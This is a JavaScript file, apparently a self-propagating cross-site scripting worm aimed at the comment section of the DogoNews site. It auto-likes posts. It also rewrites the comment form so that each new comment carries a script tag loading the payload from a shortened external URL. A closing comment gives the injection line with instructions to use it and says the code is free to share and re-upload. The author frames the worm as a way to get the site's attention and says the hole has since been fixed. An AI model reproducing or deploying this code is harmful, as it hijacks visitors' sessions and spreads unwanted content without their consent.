var script = document.createElement('script');
script.setAttribute('type', 'text/javascript');
script.setAttribute('src', 'https://code.jquery.com/jquery-3.1.1.min.js');
document.head.appendChild(script); //INJECT JQUERY

window.onload = function(){ //Fix autolike
//$(".xss").parent().parent().find('.footer').first().find('button.like.btn').first().click(); //Auto Like!
$(".xss").parent().parent().find('.footer').find('button.like.btn').click(); //Autolike Everything

//window.location = 'https://www.dogonews.com/i/imarebel/follow'; //Just incase user is not folowing me  :D
$('input[value$=Post]').first().attr('type','button').attr('onclick','var k=$(\'textarea#comment_body.text.required.form-control\').first();var f=k.val();k.val(f+\'<script src=\"https://tinyurl.com/j39dsb4\" class=\"xss\">run()</script>\');k.parent().parent().parent().submit();'); //Automatic Inject to next comment
  console.log("XSS @ComputerCandyYT on Twitter")
}
/*
-- ATTENTION --
This XSS Exploitaton has been fixed.
This was never intended to be used as a Javascript Backdoor.
This was instead intended to get the attention of DogoMedia as they did not have a contact email address or a bug tracker.

Breaks Any DogoNews page:
<script src="https://tinyurl.com/j39dsb4" class="xss">run()</script>
Just comment it with a message after and watch the magic!

--Signature--
Origional Author:
@HacksNeedFatKids#9617 on Discord
12 Years of age.
Author Currently:
@HacksNeedFatKids#9617 on Discord
12 Years of age.


This code is free to use free of charge. You can share it, Copy it & re upload it.
Just make sure that this signature is kept.
--Credits--
My Friend Seth, For trying to get people to follow him on DogoNews
My Friend Josh, For telling me Seth's goal
Me, For writing the source :D
*/
